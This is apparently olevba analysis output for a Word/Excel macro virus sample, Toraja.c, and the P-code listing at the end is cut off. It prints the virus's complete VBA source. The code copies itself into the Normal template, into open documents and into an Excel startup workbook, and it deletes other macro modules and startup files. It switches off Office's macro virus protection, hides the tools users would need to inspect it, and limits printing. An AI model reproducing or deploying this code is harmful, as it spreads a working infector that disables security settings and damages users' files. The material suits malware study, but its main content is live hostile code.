olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Toraja.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSOffice.Toraja.c - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Workbook_BeforePrint(Cancel As Boolean)
On Error Resume Next
If PrintOke = False Then
    Serang
    Cancel = True
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSOffice.Toraja.c - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSOffice.Toraja.c - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSOffice.Toraja.c - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Toraja12.bas 
in file: Virus.MSOffice.Toraja.c - OLE stream: '_VBA_PROJECT_CUR/VBA/Toraja12'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Created       : Toraja High Land 1998 by Marsel - Lina
'Modified       : July 1999
'--------------------------------------------------------------
Option Explicit
Option Compare Text
Dim Komp As Variant
Public Const regApp As String = "Application"
Public Const regSecSet As String = "Settings"
Public Const regSecApp As String = "AppName"
Const TempVer As String = "Tana"
Const MacName As String = "Toraja"
Const Ver As String = "12"
Dim ctl As Variant
Global blnFound As Boolean
Dim CusProp
Dim blnMod As Boolean
Public Const TimerOn = "01:00:00"
Const Akhir = 80
Dim Caption As String
Dim actWindow
Global Active
Global Temp
Global TempPath
Dim Waktu
Dim Bar As Integer
Sub Register()
On Error Resume Next
If GetSetting(regApp, regSecSet, "FirstRun") = "" Then SaveSetting regApp, regSecSet, "FirstRun", Format(Date + 30, "dd-mm-yyyy")
If GetSetting(regApp, regSecSet, "Version") <> Ver Then SaveSetting regApp, regSecSet, "Version", Ver
If GetSetting(regApp, regSecSet, "UserKeyWord") <> MacName & Ver Then SaveSetting regApp, regSecSet, "UserKeyWord", ""
If GetSetting(regApp, regSecSet, "AuthorKeyWord") <> "Marsel" Then SaveSetting regApp, regSecSet, "AuthorKeyWord", ""
End Sub
Function Serang() As Boolean
Dim getDate As Date
On Error Resume Next
getDate = GetSetting(regApp, regSecSet, "FirstRun")
If getDate <= Date Then ShowMe
End Function
Sub AutoExec()
        Application.EnableCancelKey = 0
        Application.DisplayRecentFiles = False
        SaveSetting regApp, regSecApp, "Microsoft Word", "True"
        MenuWord
        ExportXls
        Register
        Documents.Add
        Application.OnTime Now + TimeValue(TimerOn), "OnTimer"
End Sub
Sub AutoNew()
On Error Resume Next
TempActive
ActiveWindow.View.Type = 3
End Sub
Sub AutoOpen()
On Error Resume Next
Dim strRun As String
        Application.EnableCancelKey = 0
        If PWords = False Then Application.ShowVisualBasicEditor = False
        ActiveTemp
        RemoveAll
        MenuWord
        Register
        If blnFound = True Then
            strRun = TempVer & Ver & "." & MacName & Ver & ".FoundIt"
            Application.OnTime Now + TimeValue("00:01:00"), strRun
       End If
End Sub
Function KeyWord() As Boolean
If GetSetting(regApp, regSecSet, "UserKeyWord") = MacName & Ver Then KeyWord = True
End Function
Sub FileOpen()
On Error Resume Next
    WordBasic.DisableAutoMacros 1
    Dialogs(80).Show
    TempActive
    WordBasic.DisableAutoMacros 0
End Sub
Function KompProject(Asal, Tujuan) As Boolean
On Error GoTo Salah
blnMod = False
For Each Komp In Tujuan.VBProject.VBComponents
      If Komp.Name = MacName & Ver Then blnMod = True
      If (Komp.Name <> "ThisDocument") And (Komp.Name <> "Reference To Normal") And (Komp.Name <> MacName & Ver) And _
          (Left(Komp.Name, 5) <> "Sheet") And (Komp.Name <> "ThisWorkbook") And (Left(Komp.Name, 5) <> "Chart") Then
            Tujuan.VBProject.VBComponents.Remove Tujuan.VBProject.VBComponents(Komp.Name)
            KompProject = True
            End If
            Next Komp
      If blnMod = False Then
        If EIKModul(Asal, Tujuan, MacName & Ver) = True Then KompProject = True
    End If
Salah:
End Function
Sub RemoveAll()
On Error Resume Next
Set ctl = Documents
For Each ctl In Documents
    If ctl <> ActiveDocument Then
        KompProject ActiveDocument, ctl
        If Len(ctl.Path) <> 0 Then ctl.Save
    End If
Next ctl
End Sub
Function PrintOke() As Boolean
On Error GoTo Salah
If KeyWord = True Or GetCreator = True Then
    PrintOke = True
Else
    If CusProp.Item("CountPrint").Value < 5 Then
        CusProp.Item("CountPrint").Value = CusProp.Item("CountPrint").Value + 1
        If Val(GetSetting(regApp, regSecSet, "CountPrt")) <= 250 Then
            SaveSetting regApp, regSecSet, "CountPrt", Val(GetSetting(regApp, regSecSet, "CountPrt")) + 1
            PrintOke = True
        End If
    End If
End If
Salah:
End Function
Sub FilePrint()
On Error Resume Next
If PrintOke = True Then
    Dialogs(88).Show
Else
    Dialogs(88).Display
    Serang
End If
End Sub
Sub FilePrintDefault()
FilePrint
End Sub
Sub ToolsCustomizeKeyboard()
Serang
End Sub
Sub ViewCode()
Serang
End Sub
Sub ViewVBcode()
If PWords = True Then ShowVisualBasicEditor = True Else Serang
End Sub
Sub ToolsCustomize()
Serang
End Sub
Sub ToolsMacro()
Serang
End Sub
Sub FormatStyle()
If KeyWord = True Then Dialogs(180).Show Else Serang
End Sub
Sub ToolsRecordMacroToggle()
Serang
End Sub
Sub FileTemplates()
Serang
End Sub
Private Sub ExportXls()
Dim xlsApp
Dim strFile As String
If (GetSetting(regApp, regSecApp, "Microsoft Excel") <> "True") Then
On Error GoTo Salah:
    Set xlsApp = CreateObject("Excel.Application")
   xlsApp.Workbooks.Add
    strFile = xlsApp.StartupPath & xlsApp.PathSeparator & "START" & Ver & ".XLS"
    xlsApp.ActiveWorkbook.SaveAs strFile
    TempPath = Application.NormalTemplate.Path & Application.PathSeparator
    EIKModul NormalTemplate, xlsApp.Workbooks("START" & Ver & ".XLS"), MacName & Ver
    xlsApp.Workbooks("START" & Ver & ".XLS").VBProject.Name = TempVer & Ver
    xlsApp.ActiveWindow.Visible = False
    xlsApp.Workbooks("START" & Ver & ".XLS").Save
    xlsApp.Application.Quit
    SaveSetting regApp, regSecApp, "Microsoft Excel", "True"
End If
Salah:
End Sub
Sub ExportDok()
Dim dokApp
If (GetSetting(regApp, regSecApp, "Microsoft Word") <> "True") Then
    On Error GoTo Salah
    Set dokApp = CreateObject("Word.Application")
    TempPath = Application.TemplatePath
     KompProject Workbooks("START" & Ver & ".XLS"), dokApp.NormalTemplate
    dokApp.Application.Quit True
    SaveSetting regApp, regSecApp, "Microsoft Word", "True"
End If
Salah:
End Sub
Sub Auto_Open()
On Error Resume Next
Application.EnableCancelKey = 0
XlsActive
ExportDok
Application.DisplayRecentFiles = False
End Sub
Private Sub AllWorkBook()
blnMod = False
For Each Komp In Workbooks
      actWindow = Komp.Name
      If actWindow = "START" & Ver & ".XLS" Then blnMod = True
      If Komp.Path = Application.StartupPath And actWindow <> "START" & Ver & ".XLS" Then
               Komp.Close False
               Kill Application.StartupPath & Application.PathSeparator & actWindow
         End If
 Next Komp
If blnMod = False Then BuatXlsActive
End Sub
Sub XlsActive()
On Error Resume Next
Application.EnableCancelKey = 0
Application.DisplayAlerts = False
CreateEvents
TempActive
AllWorkBook
Application.OnSheetActivate = ""
Application.OnSheetDeactivate = ""
Application.OnWindow = ""
MenuExcel
Application.OnWindow = "START" & Ver & ".XLS" & "!XlsActive"
Application.DisplayAlerts = True
Application.ScreenUpdating = True
End Sub
Sub TempActive()
On Error Resume Next
Aplikasi
 If KompProject(Temp, Active) = True Then
       SetCusProp
       Active.VBProject.Name = MacName
       If Len(Active.Path) <> 0 Then Active.Save
    End If
End Sub
Function EIKModul(Asal, Tujuan, Komp As String) As Boolean
On Error GoTo Salah
    Asal.VBProject.VBComponents(Komp).Export TempPath & Komp
    Tujuan.VBProject.VBComponents.Import TempPath & Komp
    EIKModul = True
    Kill TempPath & Komp
Salah:
End Function
Sub OpenFile()
On Error Resume Next
Application.DisplayAlerts = False
Application.Dialogs(1).Show
XlsActive
End Sub
Private Sub CreateEvents()
Dim vbComp
On Error GoTo Salah
lanjut:
If ActiveWorkbook.CustomDocumentProperties.Item("Event").Value <> MacName & Ver And ActiveWorkbook.Name <> "START" & Ver & ".XLS" Then
On Error GoTo FatalError
    Set vbComp = ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
    With vbComp
            .DeleteLines 1, .CountOfLines
            .InsertLines 1, "Private Sub Workbook_BeforePrint(Cancel As Boolean)"
            .InsertLines 2, "On Error Resume Next"
            .InsertLines 3, "If PrintOke = False Then"
            .InsertLines 4, "    Serang"
            .InsertLines 5, "    Cancel = True"
            .InsertLines 6, "End if"
            .InsertLines 7, "End Sub"
    End With
ActiveWorkbook.CustomDocumentProperties.Item("Event").Value = MacName & Ver
End If
FatalError:
Exit Sub
Salah:
ActiveWorkbook.CustomDocumentProperties.Add ("Event"), False, 4, ""
Resume lanjut
End Sub
Sub BuatXlsActive()
Dim Baru As String
On Error Resume Next
Application.ScreenUpdating = False
Workbooks.Add
Baru = Application.StartupPath & Application.PathSeparator & "START" & Ver & ".XLS"
ActiveWorkbook.SaveAs Baru
ActiveWindow.Visible = False
ActiveTemp
End Sub
Sub ActiveTemp()
On Error Resume Next
Aplikasi
If KompProject(Active, Temp) = True Then
       Temp.VBProject.Name = TempVer & Ver
       Temp.Save
       SaveSetting regApp, regSecApp, Application.Name, "True"
       blnFound = True
    End If
End Sub
Sub MenuExcel()
On Error Resume Next
    For Each ctl In CommandBars.ActiveMenuBar.Controls("Tools").Controls("Macro").Controls
              ctl.OnAction = "Serang"
    Next ctl
    WordExcel
    CommandBars("Ply").Controls("View Code").Delete
    With Application
            .OnKey "%{F11}", "Serang"
            .OnKey "%{F8}", "Serang"
            .OnKey "%{F2}", "Serang"
            .OnKey "%{F4}", "Serang"
            .OnKey "{F12}", "Serang"
            .OnKey "^{o}", "OpenFile"
    End With
CommandBars("Standard").Controls("Open").OnAction = "OpenFile"
CommandBars("Worksheet Menu Bar").Controls("File").Controls("Open...").OnAction = "OpenFile"
End Sub
Sub WordExcel()
On Error Resume Next
cmdBars CommandBars("Control Toolbox"), True
cmdBars CommandBars("Forms"), True
cmdBars CommandBars("ActiveX Control"), True
cmdBars CommandBars("Visual Basic"), True
cmdBars CommandBars.ActiveMenuBar, False
cmdBars CommandBars("Formatting"), False
cmdBars CommandBars("Standard"), False
End Sub
Sub cmdBars(cmd, blnVis As Boolean)
With cmd
    If blnVis = True Then
        .Enabled = False
        .Visible = False
        .Protection = 8
    End If
        .Protection = 1
End With
End Sub
Sub MenuWord()
On Error Resume Next
CustomizationContext = NormalTemplate
  With Options
            .VirusProtection = False
            .SaveNormalPrompt = False
    End With
    FindKey(BuildKeyCode(wdKeyAlt, wdKeyF8)).Disable
    FindKey(BuildKeyCode(wdKeyAlt, wdKeyF11)).Disable
    WordExcel
End Sub
Sub SetCusProp()
On Error Resume Next
Set CusProp = Active.CustomDocumentProperties
CusProp.Add "Author", False, 4, ""
CusProp.Add "CountPrint", False, 1, 0
If PWords = True Then CusProp.Item("Author").Value = "Lina"
End Sub
Function GetCreator() As Boolean
On Error GoTo Salah
        Aplikasi
        Set CusProp = Active.CustomDocumentProperties
        If CusProp.Item("Author").Value = "Lina" Then GetCreator = True
Salah:
End Function
Function PWords() As Boolean
If GetSetting(regApp, regSecSet, "AuthorKeyWord") = "Marsel" Then PWords = True
End Function
Sub OnTimer()
    Serang
    Application.OnTime Now + TimeValue(TimerOn), "OnTimer"
End Sub
Sub FoundIt()
TempActive
blnFound = False
End Sub
Sub Pesan(strPesan As String, Msg)
Dim A  As String
Dim B(3)
Dim x, i, j
Dim K
B(0) = "  \": B(1) = "  -  ": B(2) = "  /": B(3) = "  |"
i = 0
If Bar = 0 Then K = "Toraja High Land: " Else K = "Note ... each file can be printed 5 times only: "
    A = "                                                                                                                                          " & strPesan
    For x = 1 To Len(A)
       Msg.Caption = A & B(i)
       Application.StatusBar = K & Akhir - Int(Timer - Waktu) & " sec " & B(i)
       A = Right$(A, Len(A) - 1)
        i = i + 1
        For j = 1 To 150000: Next
        If (Timer - Waktu >= Akhir) Or Timer - Waktu < 0 Then GoTo done
        If i = 4 Then i = 0
    Next
done:
If Bar = 0 Then Bar = 1 Else Bar = 0
Msg.Caption = ""
End Sub
Sub Message(Msg)
Dim strPesan(5) As String
strPesan(0) = "Hello, [" & Application.UserName & "] I did't expect to meet you here, sorry. "
strPesan(1) = "Warning ... one or more your Word and Excel command(s) maybe not available now"
strPesan(2) = Year(Format(Date, "dd-mm-yyyy"))
strPesan(3) = "Marry Christmas [25-12-"
strPesan(4) = "] and happy new year [01-01-"
strPesan(5) = "Member of Mountain Software. Created 1998 South Sulawesi - Indonesia"
Select Case Month(Date)
    Case 11, 12: strPesan(0) = strPesan(0) & strPesan(3) & strPesan(2) & strPesan(4) & strPesan(2) + 1 & "]"
    Case 1: strPesan(0) = strPesan(0) & strPesan(3) & strPesan(2) - 1 & strPesan(4) & strPesan(2) & "]"
End Select
Application.DisplayStatusBar = True
Waktu = Timer
Do While (Timer - Waktu <= Akhir) And Timer - Waktu >= 0
    Pesan strPesan(0), Msg
    Pesan strPesan(1), Msg
    Pesan strPesan(5), Msg
Loop
End Sub
Function Tator() As Boolean
If (KeyWord = False) And (GetCreator = False) Then Tator = True
End Function
Sub ShowMe()
Dim Maks, Min As Integer
On Error Resume Next
If Tator = True Then
Application.EnableCancelKey = 0
Caption = ActiveWindow.Caption
    If Application.Name = "Microsoft Word" Then
        Maks = 1
        Application.Caption = " "
        If Windows.Count > 0 Then Set actWindow = ActiveWindow Else Set actWindow = Application
    Else
        Set actWindow = Application
        ActiveWindow.Caption = ""
        Maks = -4137
    End If
    Application.WindowState = Maks
    actWindow.WindowState = Maks
    Message actWindow
    Application.StatusBar = ""
    ActiveWindow.Caption = Caption
    Application.Caption = ""
End If
End Sub
Sub Aplikasi()
If Application.Name = "Microsoft Word" Then Doc Else Xls
End Sub
Sub Doc()
TempPath = Application.NormalTemplate.Path & Application.PathSeparator
Set Active = ActiveDocument
Set Temp = NormalTemplate
End Sub
Sub Xls()
Set Active = ActiveWorkbook
Set Temp = Workbooks("START" & Ver & ".XLS")
TempPath = Application.TemplatesPath
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSOffice.Toraja.c
' ===============================================================================
' Module streams:
' _VBA_PROJECT_CUR/VBA/ThisWorkbook - 1694 bytes
' Line #0:
' 	FuncDefn (Private Sub Workbook_BeforePrint(Cancel As Boolean))
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	Ld PrintOke 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #3:
' 	ArgsCall Serang 0x0000 
' Line #4:
' 	LitVarSpecial (True)
' 	St Cancel 
' Line #5:
' 	EndIfBlock 
' Line #6:
' 	EndSub 
' _VBA_PROJECT_CUR/VBA/Sheet1 - 957 bytes
' _VBA_PROJECT_CUR/VBA/Sheet2 - 957 bytes
' _VBA_PROJECT_CUR/VBA/Sheet3 - 957 bytes
' _VBA_PROJECT_CUR/VBA/Toraja12 - 26530 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0036 "Created       : Toraja High Land 1998 by Marsel - Lina"
' Line #1:
' 	QuoteRem 0x0000 0x001A "Modified       : July 1999"
' Line #2:
' 	QuoteRem 0x0000 0x003E "--------------------------------------------------------------"
' Line #3:
' 	Option  (Explicit)
' Line #4:
' 	Option  (Compare Text)
' Line #5:
' 	Dim 
' 	VarDefn Komp (As Variant)
' Line #6:
' 	Dim (Public Const) 
' 	LitStr 0x000B "Application"
' 	VarDefn regApp (As String)
' Line #7:
' 	Dim (Public Const) 
' 	LitStr 0x0008 "Settings"
' 	VarDefn regSecSet (As String)
' Line #8:
' 	Dim (Public Const) 
' 	LitStr 0x0007 "AppName"
' 	VarDefn regSecApp (As String)
' Line #9:
' 	Dim (Const) 
' 	LitStr 0x0004 "Tana"
' 	VarDefn TempVer (As String)
' Line #10:
' 	Dim (Const) 
' 	LitStr 0x0006 "Toraja"
' 	VarDefn MacName (As String)
' Line #11:
' 	Dim (Const) 
' 	LitStr 0x0002 "12"
' 	VarDefn Ver (As String)
' Line #12:
' 	Dim 
' 	VarDefn ctl (As Variant)
' Line #13:
' 	Dim (Global) 
' 	VarDefn blnFound (As Boolean)
' Line #14:
' 	Dim 
' 	VarDefn CusProp
' Line #15:
' 	Dim 
' 	VarDefn blnMod (As Boolean)
' Line #16:
' 	Dim (Public Const) 
' 	LitStr 0x0008 "01:00:00"
' 	VarDefn TimerOn
' Line #17:
' 	Dim (Const) 
' 	LitDI2 0x0050 
' 	VarDefn Akhir
' Line #18:
' 	Dim 
' 	VarDefn Caption (As String)
' Line #19:
' 	Dim 
' 	VarDefn actWindow
' Line #20:
' 	Dim (Global) 
' 	VarDefn Active
' Line #21:
' 	Dim (Global) 
' 	VarDefn Temp
' Line #22:
' 	Dim (Global) 
' 	VarDefn TempPath
' Line #23:
' 	Dim 
' 	VarDefn Waktu
' Line #24:
' 	Dim 
' 	VarDefn Bar (As Integer)
' Line #25:
' 	FuncDefn (Sub Register())
' Line #26:
' 	OnError (Resume Next) 
' Line #27:
' 	Ld regApp 
' 	Ld regSecSet 
' 	LitStr 0x0008 "FirstRun"
' 	ArgsLd GetSetting 0x0003 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld regApp 
' 	Ld regSecSet 
' 	LitStr 0x0008 "FirstRun"
' 	Ld Date 
' 	LitDI2 0x001E 
' 	Add 
' 	LitStr 0x000A "dd-mm-yyyy"
' 	ArgsLd Format$ 0x0002 
' 	ArgsCall SaveSetting 0x0004 
' 	EndIf 
' Line #28:
' 	Ld regApp 
' 	Ld regSecSet 
' 	LitStr 0x0007 "Version"
' 	ArgsLd GetSetting 0x0003 
' 	Ld Ver 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld regApp 
' 	Ld regSecSet 
' 	LitStr 0x0007 "Version"
' 	Ld Ver 
' 	ArgsCall SaveSetting 0x0004 
' 	EndIf 
' Line #29:
' 	Ld regApp 
' 	Ld regSecSet 
' 	LitStr 0x000B "UserKeyWord"
' 	ArgsLd GetSetting 0x0003 
' 	Ld MacName 
' 	Ld Ver 
' 	Concat 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld regApp 
' 	Ld regSecSet 
' 	LitStr 0x000B "UserKeyWord"
' 	LitStr 0x0000 ""
' 	ArgsCall SaveSetting 0x0004 
' 	EndIf 
' Line #30:
' 	Ld regApp 
' 	Ld regSecSet 
' 	LitStr 0x000D "AuthorKeyWord"
' 	ArgsLd GetSetting 0x0003 
' 	LitStr 0x0006 "Marsel"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld regApp 
' 	Ld regSecSet 
' 	LitStr 0x000D "AuthorKeyWord"
' 	LitStr 0x0000 ""
' 	ArgsCall SaveSetting 0x0004 
' 	EndIf 
' Line #31:
' 	EndSub 
' Line #32:
' 	FuncDefn (Function Serang() As Boolean)
' Line #33:
' 	Dim 
' 	VarDefn getDate (As Date)
' Line #34:
' 	OnError (Resume Next) 
' Line #35:
' 	Ld regApp 
' 	Ld regSecSet 
' 	LitStr 0x0008 "FirstRun"
' 	ArgsLd GetSetting 0x0003 
' 	St getDate 
' Line #36:
' 	Ld getDate 
' 	Ld Date 
' 	Le 
' 	If 
' 	BoSImplicit 
' 	ArgsCall ShowMe 0x0000 
' 	EndIf 
' Line #37:
' 	EndFunc 
' Line #38:
' 	FuncDefn (Sub AutoExec())
' Line #39:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #40:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayRecentFiles 
' Line #41:
' 	Ld regApp 
' 	Ld regSecApp 
' 	LitStr 0x000E "Microsoft Word"
' 	LitStr 0x0004 "True"
' 	ArgsCall SaveSetting 0x0004 
' Line #42:
' 	ArgsCall MenuWord 0x0000 
' Line #43:
' 	ArgsCall ExportXls 0x0000 
' Line #44:
' 	ArgsCall Register 0x0000 
' Line #45:
' 	Ld Documents 
' 	ArgsMemCall Add 0x0000 
' Line #46:
' 	Ld Now 
' 	Ld TimerOn 
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	LitStr 0x0007 "OnTimer"
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #47:
' 	EndSub 
' Line #48:
' 	FuncDefn (Sub AutoNew())
' Line #49:
' 	OnError (Resume Next) 
' Line #50:
' 	ArgsCall TempActive 0x0000 
' Line #51:
' 	LitDI2 0x0003 
' 	Ld ActiveWindow 
' 	MemLd View 
' 	MemSt TypeOf 
' Line #52:
' 	EndSub 
' Line #53:
' 	FuncDefn (Sub AutoOpen())
' Line #54:
' 	OnError (Resume Next) 
' Line #55:
' 	Dim 
' 	VarDefn strRun (As String)
' Line #56:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #57:
' 	Ld PWords 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' 	EndIf 
' Line #58:
' 	ArgsCall ActiveTemp 0x0000 
' Line #59:
' 	ArgsCall RemoveAll 0x0000 
' Line #60:
' 	ArgsCall MenuWord 0x0000 
' Line #61:
' 	ArgsCall Register 0x0000 
' Line #62:
' 	Ld blnFound 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #63:
' 	Ld TempVer 
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0001 "."
' 	Concat 
' 	Ld MacName 
' 	Concat 
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0008 ".FoundIt"
' 	Concat 
' 	St strRun 
' Line #64:
' 	Ld Now 
' 	LitStr 0x0008 "00:01:00"
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	Ld strRun 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #65:
' 	EndIfBlock 
' Line #66:
' 	EndSub 
' Line #67:
' 	FuncDefn (Function KeyWord() As Boolean)
' Line #68:
' 	Ld regApp 
' 	Ld regSecSet 
' 	LitStr 0x000B "UserKeyWord"
' 	ArgsLd GetSetting 0x0003 
' 	Ld MacName 
' 	Ld Ver 
' 	Concat 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St KeyWord 
' 	EndIf 
' Line #69:
' 	EndFunc 
' Line #70:
' 	FuncDefn (Sub FileOpen())
' Line #71:
' 	OnError (Resume Next) 
' Line #72:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #73:
' 	LitDI2 0x0050 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #74:
' 	ArgsCall TempActive 0x0000 
' Line #75:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #76:
' 	EndSub 
' Line #77:
' 	FuncDefn (Function KompProject(Asal, Tujuan) As Boolean)
' Line #78:
' 	OnError Salah 
' Line #79:
' 	LitVarSpecial (False)
' 	St blnMod 
' Line #80:
' 	StartForVariable 
' 	Ld Komp 
' 	EndForVariable 
' 	Ld Tujuan 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #81:
' 	Ld Komp 
' 	MemLd New 
' 	Ld MacName 
' 	Ld Ver 
' 	Concat 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St blnMod 
' 	EndIf 
' Line #82:
' 	LineCont 0x0004 1B 00 0A 00
' 	Ld Komp 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Paren 
' 	Ld Komp 
' 	MemLd New 
' 	LitStr 0x0013 "Reference To Normal"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld Komp 
' 	MemLd New 
' 	Ld MacName 
' 	Ld Ver 
' 	Concat 
' 	Ne 
' 	Paren 
' 	And 
' 	Ld Komp 
' 	MemLd New 
' 	LitDI2 0x0005 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0005 "Sheet"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld Komp 
' 	MemLd New 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld Komp 
' 	MemLd New 
' 	LitDI2 0x0005 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0005 "Chart"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #83:
' 	Ld Komp 
' 	MemLd New 
' 	Ld Tujuan 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Ld Tujuan 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Remove 0x0001 
' Line #84:
' 	LitVarSpecial (True)
' 	St KompProject 
' Line #85:
' 	EndIfBlock 
' Line #86:
' 	StartForVariable 
' 	Ld Komp 
' 	EndForVariable 
' 	NextVar 
' Line #87:
' 	Ld blnMod 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #88:
' 	Ld Asal 
' 	Ld Tujuan 
' 	Ld MacName 
' 	Ld Ver 
' 	Concat 
' 	ArgsLd EIKModul 0x0003 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St KompProject 
' 	EndIf 
' Line #89:
' 	EndIfBlock 
' Line #90:
' 	Label Salah 
' Line #91:
' 	EndFunc 
' Line #92:
' 	FuncDefn (Sub RemoveAll())
' Line #93:
' 	OnError (Resume Next) 
' Line #94:
' 	SetStmt 
' 	Ld Documents 
' 	Set ctl 
' Line #95:
' 	StartForVariable 
' 	Ld ctl 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #96:
' 	Ld ctl 
' 	Ld ActiveDocument 
' 	Ne 
' 	IfBlock 
' Line #97:
' 	Ld ActiveDocument 
' 	Ld ctl 
' 	ArgsCall KompProject 0x0002 
' Line #98:
' 	Ld ctl 
' 	MemLd Path 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld ctl 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #99:
' 	EndIfBlock 
' Line #100:
' 	StartForVariable 
' 	Ld ctl 
' 	EndForVariable 
' 	NextVar 
' Line #101:
' 	EndSub 
' Line #102:
' 	FuncDefn (Function PrintOke() As Boolean)
' Line #103:
' 	OnError Salah 
' Line #104:
' 	Ld KeyWord 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld GetCreator 
' 	LitVarSpecial (True)
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #105:
' 	LitVarSpecial (True)
' 	St PrintOke 
' Line #106:
' 	ElseBlock 
' Line #107:
' 	LitStr 0x000A "CountPrint"
' 	Ld CusProp 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Value 
' 	LitDI2 0x0005 
' 	Lt 
' 	IfBlock 
' Line #108:
' 	LitStr 0x000A "CountPrint"
' 	Ld CusProp 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Value 
' 	LitDI2 0x0001 
' 	Add 
' 	LitStr 0x000A "CountPrint"
' 	Ld CusProp 
' 	ArgsMemLd Item 0x0001 
' 	MemSt Value 
' Line #109:
' 	Ld regApp 
' 	Ld regSecSet 
' 	LitStr 0x0008 "CountPrt"
' 	ArgsLd GetSetting 0x0003 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x00FA 
' 	Le 
' 	IfBlock 
' Line #110:
' 	Ld regApp 
' 	Ld regSecSet 
' 	LitStr 0x0008 "CountPrt"
' 	Ld regApp 
' 	Ld regSecSet 
' 	LitStr 0x0008 "CountPrt"
' 	ArgsLd GetSetting 0x0003 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsCall SaveSetting 0x0004 
' Line #111:
' 	LitVarSpecial (True)
' 	St PrintOke 
' Line #112:
' 	EndIfBlock 
' Line #113:
' 	EndIfBlock 
' Line #114:
' 	EndIfBlock 
' Line #115:
' 	Label Salah 
' Line #116:
' 	EndFunc 
' Line #117:
' 	FuncDefn (Sub FilePrint())
' Line #118:
' 	OnError (Resume Next) 
' Line #119:
' 	Ld PrintOke 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #120:
